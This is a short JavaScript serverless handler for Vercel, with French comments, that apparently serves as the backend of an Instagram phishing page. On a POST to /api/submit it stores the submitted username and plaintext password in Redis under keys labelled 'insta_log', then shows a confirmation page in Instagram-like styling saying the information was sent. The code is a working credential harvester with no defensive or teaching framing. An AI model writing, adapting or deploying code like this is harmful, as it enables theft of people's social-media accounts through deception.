// api/index.js
const { Redis } = require('@upstash/redis');

// Connexion à Redis avec les variables d'environnement de Vercel
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

// Le handler pour Vercel
module.exports = async (req, res) => {
  // Gérer la route POST /api/submit
  if (req.method === 'POST' && req.url === '/api/submit') {
    const { username, password } = req.body;
    
    const logKey = `insta_log:${Date.now()}`;

    try {
      await redis.hset(logKey, { username, password, date: new Date().toISOString() });
      console.log(`Sauvegardé: ${logKey}`);
    } catch (error) {
      console.error('Erreur Redis:', error);
    }

    // Afficher la page de confirmation
    res.send(`
        <!DOCTYPE html>
        <html lang="fr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Confirmation</title>
            <style>
                body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fafafa; }
                .message-box { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
                h1 { color: #0095f6; }
                p { color: #8e8e8e; }
            </style>
        </head>
        <body>
            <div class="message-box">
                <h1>Données envoyées</h1>
                <p>Vos informations ont été bien envoyées.</p>
            </div>
        </body>
        </html>
    `);
    return;
  }

  // Pour toutes les autres requêtes, renvoyer une erreur 404
  res.status(404).send('Not Found');
};